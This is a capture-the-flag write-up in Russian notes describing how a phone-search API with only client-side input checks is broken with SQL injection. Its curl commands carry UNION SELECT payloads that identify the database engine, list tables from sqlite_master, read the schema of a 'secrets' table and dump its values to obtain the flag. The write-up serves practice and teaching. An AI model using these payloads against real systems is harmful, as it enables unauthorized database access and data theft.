*Первая таска - используем SQLi*
дан сайт с вводом только цифр (ограничение на фронте)
но на бэке его нет
используем curl
для начала узнаем какая версия  SQL:
### PostgreSQL

```
curl -L https://vkjx0rjqjj.tasks.zeroplus.redshiftctf.ru/api/search \  
-H "Content-Type: application/json" \  
-d '{"phone":"%\' UNION SELECT current_database(),NULL,NULL,NULL--"}'
```

---

### SQLite
`-d '{"phone":"%\' UNION SELECT sqlite_version(),NULL,NULL,NULL--"}'`

---

### MySQL

`-d '{"phone":"%\' UNION SELECT database(),NULL,NULL,NULL--"}'`

* используется SQLite
значит, мы можем достать все таблицы с помощью ==sqlite_master==:
```
curl -L https://vkjx0rjqjj.tasks.zeroplus.redshiftctf.ru/api/search \
                                           -H "Content-Type: application/json" \
                                           -d '{"phone":"%\' UNION SELECT name,NULL,NULL,NULL FROM sqlite_master WHERE type=\'table\'--"}'`
```
Вывод, мы увидели таблицу secrets:
*{"results":[{"full_name":"employees","department":null,"phone":null,"position* 
*":null},{"full_name":"secrets","department":null,"phone":null,"position":null*  
*},{"full_name":"sqlite_sequence","department":null,"phone":null,"position":nu*  
*ll},*
далее используем колонку ==sql==, чтобы понять, как была создана эта таблица: 
```
curl -L https://vkjx0rjqjj.tasks.zerop  
lus.redshiftctf.ru/api/search \  
                                          -H "Content-Type: application/json  
" \  
                                          -d '{"phone":"%\' UNION SELECT sql  
,NULL,NULL,NULL FROM sqlite_master WHERE name=\'secrets\'--"}'  
```
*{"results":[{"full_name":"CREATE TABLE secrets (\r\n    id INTEGER PRIMARY KE*  
*Y AUTOINCREMENT,\r\n    secret_name TEXT NOT NULL,\r\n    secret_value TEXT N*  
*OT NULL\r\n)"*

Далее, зная параметры этой таблцы, нам не составит труда посмотреть ее  содержимое, используя все ту же уязвимость:
```
curl -L https://vkjx0rjqjj.tasks.zerop  
lus.redshiftctf.ru/api/search \  
                                          -H "Content-Type: application/json  
" \  
                                          -d '{"phone":"%\' UNION SELECT sec  
ret_value,NULL,NULL,NULL FROM secrets--"}'  
```
наш флаг ==FLAG{sql_1nj3ct10n_byp4ss_cl13nt_v4l1d4t10n}:

![[Screenshot_20260315_004104.png]]